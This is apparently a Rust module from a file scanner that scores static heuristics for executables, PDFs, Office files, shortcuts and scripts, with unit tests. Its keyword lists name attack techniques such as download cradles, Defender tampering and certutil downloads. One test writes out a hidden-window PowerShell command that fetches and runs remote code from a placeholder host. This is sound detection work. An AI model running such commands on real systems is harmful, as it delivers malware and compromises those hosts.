//! Layer C: static heuristic analysis. Produces *evidence*, never verdicts. Legitimate software trips many of
//! these indicators, so no heuristic finding alone can yield MALICIOUS (only SUSPICIOUS, via the weighted score).

use crate::identify::FileKind;
use crate::types::{Finding, FindingKind, Severity};
use goblin::pe::PE;

const SRC_PE: &str = "heuristic.pe";
const SRC_SCRIPT: &str = "heuristic.script";
const SRC_DOC: &str = "heuristic.document";
const SRC_EMBED: &str = "heuristic.embedded";

fn f(source: &str, name: &str, sev: Severity, ev: impl Into<String>) -> Finding {
    Finding::new(source, name, FindingKind::Heuristic, sev, ev)
}

/// Shannon entropy in bits/byte (0..8).
pub fn entropy(data: &[u8]) -> f64 {
    if data.is_empty() {
        return 0.0;
    }
    let mut counts = [0u64; 256];
    for &b in data {
        counts[b as usize] += 1;
    }
    let n = data.len() as f64;
    counts.iter().filter(|&&c| c > 0).map(|&c| {
        let p = c as f64 / n;
        -p * p.log2()
    }).sum()
}

/// Dispatch by detected kind. Each analyzer is isolated by the caller with `catch_unwind`.
pub fn analyze(kind: FileKind, data: &[u8]) -> Vec<Finding> {
    let mut out = match kind {
        FileKind::Pe => analyze_pe(data),
        FileKind::Elf | FileKind::MachO => analyze_native_other(kind, data),
        FileKind::Pdf => analyze_pdf(data),
        FileKind::Ole2 => analyze_ole2(data),
        FileKind::Lnk => analyze_lnk(data),
        FileKind::Html => analyze_script_text(kind, data),
        k if k.is_script() => analyze_script_text(k, data),
        _ => Vec::new(),
    };
    if !matches!(kind, FileKind::Pe) {
        out.extend(embedded_pe(data, 0, SRC_EMBED, "Executable payload embedded in a non-executable file"));
    }
    // What attackers do, as checkable evidence (see rules.rs). Runs for every kind; archive members come through here too.
    out.extend(crate::rules::analyze(kind, data));
    out
}

// ---- Portable Executable -------------------------------------------------------------------------------------

const PACKER_SECTIONS: &[&str] = &["upx0", "upx1", "upx2", ".aspack", ".adata", ".themida", ".vmp0", ".vmp1", ".petite", ".mpress1", ".nsp0", ".enigma1"];

/// API combinations that are individually common but together describe a capability worth a human look.
const INJECTION: &[&str] = &["virtualallocex", "writeprocessmemory", "createremotethread"];
const HOLLOWING: &[&str] = &["ntunmapviewofsection", "setthreadcontext", "resumethread"];
const KEYLOG: &[&str] = &["setwindowshookexa", "setwindowshookexw", "getasynckeystate"];
const DOWNLOAD_EXEC: &[&str] = &["urldownloadtofilea", "urldownloadtofilew", "internetreadfile", "winhttpreaddata"];
const EXEC: &[&str] = &["shellexecutea", "shellexecutew", "winexec", "createprocessa", "createprocessw"];
const PERSIST: &[&str] = &["regsetvalueexa", "regsetvalueexw", "regcreatekeyexa", "regcreatekeyexw", "createservicea", "createservicew"];

fn analyze_pe(data: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    let pe = match PE::parse(data) {
        Ok(p) => p,
        Err(e) => {
            out.push(f(SRC_PE, "Malformed executable structure", Severity::Medium, format!("The PE headers could not be parsed: {e}. Corrupt or deliberately malformed executables can be used to evade tools.")));
            return out;
        }
    };

    // Section layout: W+X sections, packer names, high entropy.
    let mut high_entropy = false;
    for s in &pe.sections {
        let name = s.name().unwrap_or("?").to_ascii_lowercase();
        let chars = s.characteristics;
        let writable = chars & 0x8000_0000 != 0;
        let executable = chars & 0x2000_0000 != 0;
        if writable && executable {
            out.push(f(SRC_PE, "Section is both writable and executable", Severity::Low, format!("Section '{name}' can be modified and executed; this is typical of packers and self-modifying code but also of some legitimate software.")));
        }
        if PACKER_SECTIONS.contains(&name.as_str()) {
            out.push(f(SRC_PE, "Known packer section name", Severity::Low, format!("Section '{name}' is used by an executable packer.")));
        }
        let off = s.pointer_to_raw_data as usize;
        let len = (s.size_of_raw_data as usize).min(data.len().saturating_sub(off));
        if len >= 4096 && off < data.len() {
            let e = entropy(&data[off..off + len]);
            if e > 7.4 {
                high_entropy = true;
                out.push(f(SRC_PE, "Very high section entropy", Severity::Low, format!("Section '{name}' has entropy {e:.2}/8, consistent with compressed or encrypted content.")));
            }
        }
    }

    // Imports: lowercase names; evaluate capability combinations rather than single APIs.
    let imports: Vec<String> = pe.imports.iter().map(|i| i.name.to_ascii_lowercase()).collect();
    let has_all = |set: &[&str]| set.iter().all(|n| imports.iter().any(|i| i == n));
    let has_any = |set: &[&str]| set.iter().any(|n| imports.iter().any(|i| i == n));
    if has_all(INJECTION) {
        out.push(f(SRC_PE, "Process-injection API combination", Severity::Medium, "Imports VirtualAllocEx, WriteProcessMemory and CreateRemoteThread together, which allows code to be written into and run inside another process. Debuggers and security tools also do this."));
    }
    if has_all(HOLLOWING) {
        out.push(f(SRC_PE, "Process-hollowing API combination", Severity::Medium, "Imports NtUnmapViewOfSection, SetThreadContext and ResumeThread together, a pattern used to replace the code of a running process."));
    }
    if has_any(&KEYLOG[..2]) && has_any(&KEYLOG[2..]) {
        out.push(f(SRC_PE, "Keyboard-monitoring API combination", Severity::Medium, "Imports a global input hook together with key-state polling. Accessibility, macro and remote-support tools do this as well."));
    }
    if has_any(DOWNLOAD_EXEC) && has_any(EXEC) && has_any(PERSIST) {
        out.push(f(SRC_PE, "Download, execute and persistence capabilities", Severity::Medium, "Imports network download, process launch and registry/service-modification APIs together, a typical dropper layout that installers and updaters also exhibit."));
    }
    if pe.imports.is_empty() && !pe.is_lib && data.len() > 8192 {
        out.push(f(SRC_PE, "No import table", Severity::Low, "The executable declares no imports; it may resolve APIs dynamically to hide its capabilities."));
    }
    if high_entropy && pe.imports.len() <= 8 {
        out.push(f(SRC_PE, "Packed-looking executable", Severity::Low, "High-entropy content with very few imports suggests the real code is compressed or encrypted at rest."));
    }

    // Overlay: data after the last section. Droppers often append a second executable here.
    let end_of_sections = pe.sections.iter().map(|s| (s.pointer_to_raw_data as u64) + (s.size_of_raw_data as u64)).max().unwrap_or(0) as usize;
    if end_of_sections > 0 && end_of_sections < data.len() {
        out.extend(embedded_pe(&data[end_of_sections..], end_of_sections, SRC_PE, "Second executable appended to this executable"));
    }
    out
}

/// Look for a second PE image (MZ header whose e_lfanew points at "PE\0\0") past the start of `data`.
fn embedded_pe(data: &[u8], base: usize, source: &str, name: &str) -> Vec<Finding> {
    let mut start = if base == 0 { 1 } else { 0 };
    if start >= data.len() {
        return Vec::new();
    }
    while let Some(rel) = memchr::memmem::find(&data[start..], b"MZ") {
        let at = start + rel;
        if let Some(hdr) = data.get(at..at + 0x40) {
            let lf = u32::from_le_bytes([hdr[0x3c], hdr[0x3d], hdr[0x3e], hdr[0x3f]]) as usize;
            if (0x40..0x400).contains(&lf) && data.get(at + lf..at + lf + 4) == Some(b"PE\0\0") {
                return vec![f(source, name, Severity::Medium, format!("A valid PE header was found at byte offset {}. Installers also bundle executables, so verify the source.", base + at))];
            }
        }
        start = at + 2;
        if start >= data.len() {
            break;
        }
    }
    Vec::new()
}

fn analyze_native_other(kind: FileKind, data: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    if memchr::memmem::find(data, b"UPX!").is_some() {
        out.push(f(SRC_PE, "UPX-packed executable", Severity::Low, "Contains the UPX packer marker. UPX is also used by legitimate software to reduce size."));
    }
    match kind {
        FileKind::Elf => {
            if let Err(e) = goblin::elf::Elf::parse(data) {
                out.push(f(SRC_PE, "Malformed ELF structure", Severity::Medium, format!("The ELF headers could not be parsed: {e}.")));
            } else if entropy(&data[..data.len().min(1 << 20)]) > 7.6 {
                out.push(f(SRC_PE, "Very high executable entropy", Severity::Low, "Consistent with a packed or encrypted binary."));
            }
        }
        FileKind::MachO => {
            if let Err(e) = goblin::mach::Mach::parse(data) {
                out.push(f(SRC_PE, "Malformed Mach-O structure", Severity::Medium, format!("The Mach-O headers could not be parsed: {e}.")));
            }
        }
        _ => {}
    }
    out
}

// ---- Scripts ----------------------------------------------------------------------------------------------

fn has(s: &str, needle: &str) -> bool {
    s.contains(needle)
}

fn analyze_script_text(kind: FileKind, data: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    let text = String::from_utf8_lossy(&data[..data.len().min(2 * 1024 * 1024)]).to_ascii_lowercase();
    let t = text.as_str();

    // Long base64-looking blobs are a common payload container in any script language.
    if longest_base64_run(t) >= 400 {
        out.push(f(SRC_SCRIPT, "Large encoded blob", Severity::Low, "Contains a long Base64-like string, often used to hide a payload."));
    }

    let download = has(t, "downloadstring") || has(t, "downloadfile") || has(t, "net.webclient") || has(t, "invoke-webrequest") || has(t, "start-bitstransfer") || has(t, "urlmon") || has(t, "msxml2.xmlhttp") || has(t, "winhttp.winhttprequest");
    let exec_dyn = has(t, "invoke-expression") || has(t, "iex ") || has(t, "iex(") || has(t, "eval(") || has(t, "execute(") || has(t, "start-process");
    let hidden = has(t, "-windowstyle hidden") || has(t, "-w hidden") || has(t, "-noprofile") && has(t, "-nop");
    let bypass = has(t, "-executionpolicy bypass") || has(t, "-ep bypass") || has(t, "set-mppreference") || has(t, "disablerealtimemonitoring");
    let encoded_cmd = has(t, "-encodedcommand") || has(t, " -enc ") || has(t, "frombase64string");

    match kind {
        FileKind::ScriptPowerShell | FileKind::ScriptBatch => {
            if has(t, "disablerealtimemonitoring") || has(t, "set-mppreference") || has(t, "add-mppreference") && has(t, "exclusion") {
                out.push(f(SRC_SCRIPT, "Attempts to alter antivirus settings", Severity::High, "References Defender preference changes (e.g. disabling real-time monitoring or adding exclusions)."));
            }
            if download && exec_dyn {
                out.push(f(SRC_SCRIPT, "Downloads and runs content", Severity::High, "Combines a network download with dynamic execution (a 'download cradle'). Admin and install scripts also do this, but it is a common malware delivery pattern."));
            } else if download {
                out.push(f(SRC_SCRIPT, "Downloads content from the network", Severity::Low, "Fetches data from a remote address."));
            }
            if encoded_cmd {
                out.push(f(SRC_SCRIPT, "Uses encoded commands", Severity::Medium, "Runs Base64-encoded PowerShell, which hides what will execute."));
            }
            if hidden || bypass {
                out.push(f(SRC_SCRIPT, "Hides its window or bypasses execution policy", Severity::Low, "Runs without a visible window or ignores the execution policy."));
            }
            if has(t, "certutil") && has(t, "-urlcache") || has(t, "bitsadmin") && has(t, "/transfer") {
                out.push(f(SRC_SCRIPT, "Uses built-in tools to download files", Severity::Medium, "Uses certutil/bitsadmin as a downloader, a technique to avoid dedicated download code."));
            }
            if (has(t, "currentversion\\run") || has(t, "schtasks") && has(t, "/create")) && !has(t, "#requires") {
                out.push(f(SRC_SCRIPT, "Creates a persistence mechanism", Severity::Low, "Registers itself to run at logon or on a schedule."));
            }
        }
        FileKind::ScriptVbs | FileKind::ScriptJs | FileKind::Html => {
            if has(t, "wscript.shell") && (has(t, ".run") || has(t, ".exec")) {
                out.push(f(SRC_SCRIPT, "Launches programs via Windows Script Host", Severity::Medium, "Creates WScript.Shell and runs a command."));
            }
            if download && has(t, "adodb.stream") {
                out.push(f(SRC_SCRIPT, "Downloads and writes a file to disk", Severity::High, "Combines an HTTP request with ADODB.Stream file writing, a classic script-dropper layout."));
            }
            if has(t, "fromcharcode") && has(t, "eval(") || has(t, "unescape(") && has(t, "eval(") {
                out.push(f(SRC_SCRIPT, "Obfuscated dynamic code", Severity::Medium, "Builds code from character codes or escapes and evaluates it at runtime."));
            }
        }
        FileKind::ScriptPython | FileKind::ScriptShell => {
            if download && exec_dyn || (has(t, "curl ") || has(t, "wget ")) && (has(t, "| sh") || has(t, "| bash") || has(t, "|sh") || has(t, "|bash")) {
                out.push(f(SRC_SCRIPT, "Downloads and runs content", Severity::Medium, "Pipes remote content into an interpreter. Many legitimate installers do this too."));
            }
            if has(t, "base64") && (has(t, "exec(") || has(t, "eval(")) {
                out.push(f(SRC_SCRIPT, "Decodes and executes content", Severity::Medium, "Decodes Base64 data and runs it."));
            }
        }
        _ => {}
    }
    out
}

fn longest_base64_run(s: &str) -> usize {
    let (mut best, mut cur) = (0, 0);
    for b in s.bytes() {
        if b.is_ascii_alphanumeric() || b == b'+' || b == b'/' || b == b'=' {
            cur += 1;
            best = best.max(cur);
        } else {
            cur = 0;
        }
    }
    best
}

// ---- Documents ---------------------------------------------------------------------------------------------

fn analyze_pdf(data: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    let head = &data[..data.len().min(8 * 1024 * 1024)];
    let count = |n: &[u8]| memchr::memmem::find_iter(head, n).count();
    let js = count(b"/JavaScript") + count(b"/JS");
    let launch = count(b"/Launch");
    let open_action = count(b"/OpenAction") + count(b"/AA");
    let embedded = count(b"/EmbeddedFile");
    if launch > 0 {
        out.push(f(SRC_DOC, "PDF can launch external programs", Severity::Medium, "Contains a /Launch action, which asks the reader to run a program or open a file."));
    }
    if js > 0 && open_action > 0 {
        out.push(f(SRC_DOC, "PDF runs JavaScript automatically", Severity::Medium, "Contains JavaScript triggered on open. Some forms use this legitimately."));
    } else if js > 0 {
        out.push(f(SRC_DOC, "PDF contains JavaScript", Severity::Low, "Contains embedded JavaScript."));
    }
    if embedded > 0 {
        out.push(f(SRC_DOC, "PDF has embedded files", Severity::Low, "Contains one or more attached files."));
    }
    if memchr::memmem::find(head, b"/Encrypt").is_some() {
        out.push(Finding::new(SRC_DOC, "Encrypted PDF content", FindingKind::Coverage, Severity::Info, "Parts of this PDF are encrypted and cannot be inspected."));
    }
    out
}

fn analyze_ole2(data: &[u8]) -> Vec<Finding> {
    let mut out = Vec::new();
    let Ok(cf) = cfb::CompoundFile::open(std::io::Cursor::new(data)) else {
        out.push(f(SRC_DOC, "Malformed Office container", Severity::Low, "The legacy Office/installer container could not be parsed."));
        return out;
    };
    let mut macros = false;
    let mut autoexec = false;
    for e in cf.walk() {
        let p = e.path().to_string_lossy().to_ascii_lowercase();
        if p.contains("/macros/") || p.ends_with("/vba") || p.contains("/vba/") || p.contains("_vba_project") {
            macros = true;
        }
        if p.ends_with("/thisdocument") || p.ends_with("/thisworkbook") || p.ends_with("/autoopen") {
            autoexec = true;
        }
    }
    if macros {
        let sev = if autoexec { Severity::Medium } else { Severity::Low };
        out.push(f(SRC_DOC, "Contains VBA macros", sev, "Macros can run code when enabled. Their source was not decompiled by this scan, so their behaviour is unknown."));
    }
    out
}

fn analyze_lnk(data: &[u8]) -> Vec<Finding> {
    let mut out = vec![f(SRC_DOC, "Windows shortcut file", Severity::Low, "Shortcuts can launch programs with arguments and are a common delivery format when received from outside your organization.")];
    let lower = String::from_utf8_lossy(data).to_ascii_lowercase();
    let wide: String = data.chunks_exact(2).map(|c| u16::from_le_bytes([c[0], c[1]])).filter_map(|u| char::from_u32(u as u32)).collect::<String>().to_ascii_lowercase();
    for t in [lower.as_str(), wide.as_str()] {
        if has(t, "powershell") || has(t, "cmd.exe /c") || has(t, "mshta") || has(t, "wscript") {
            out.push(f(SRC_DOC, "Shortcut launches a script interpreter", Severity::Medium, "The shortcut target or arguments reference PowerShell, cmd, mshta or Windows Script Host."));
            break;
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn empty_and_one_byte_files_do_not_panic() {
        for kind in [FileKind::Unknown, FileKind::Text, FileKind::Zip, FileKind::Pdf, FileKind::Pe, FileKind::ScriptJs] {
            let _ = analyze(kind, b"");
            let _ = analyze(kind, b"M");
        }
    }

    #[test]
    fn entropy_bounds() {
        assert!(entropy(&[0u8; 1000]) < 0.01);
        let d: Vec<u8> = (0..=255u8).cycle().take(4096).collect();
        assert!(entropy(&d) > 7.9);
    }

    #[test]
    fn download_cradle_is_high() {
        let s = b"powershell -nop -w hidden -c \"IEX (New-Object Net.WebClient).DownloadString('http://x/a')\"";
        let r = analyze(FileKind::ScriptPowerShell, s);
        assert!(r.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn benign_script_has_no_findings() {
        let r = analyze(FileKind::ScriptPowerShell, b"Write-Host 'hello'\nGet-ChildItem\n");
        assert!(r.is_empty(), "{r:?}");
    }

    #[test]
    fn pdf_javascript_openaction_flagged() {
        let r = analyze(FileKind::Pdf, b"%PDF-1.4 /OpenAction << /JS (app.alert(1)) /S /JavaScript >>");
        assert!(r.iter().any(|f| f.severity >= Severity::Medium));
    }

    #[test]
    fn embedded_pe_in_document_detected() {
        let mut d = b"%PDF-1.4 blah blah ".to_vec();
        let mut pe = vec![0u8; 0x100];
        pe[0] = b'M';
        pe[1] = b'Z';
        pe[0x3c] = 0x80;
        pe[0x80..0x84].copy_from_slice(b"PE\0\0");
        d.extend_from_slice(&pe);
        let r = analyze(FileKind::Pdf, &d);
        assert!(r.iter().any(|f| f.name.contains("embedded")));
    }

    #[test]
    fn garbage_pe_is_flagged_not_crashed() {
        let mut d = vec![0u8; 512];
        d[0] = b'M';
        d[1] = b'Z';
        let r = analyze(FileKind::Pe, &d);
        assert!(r.iter().any(|f| f.severity >= Severity::Medium));
    }
}
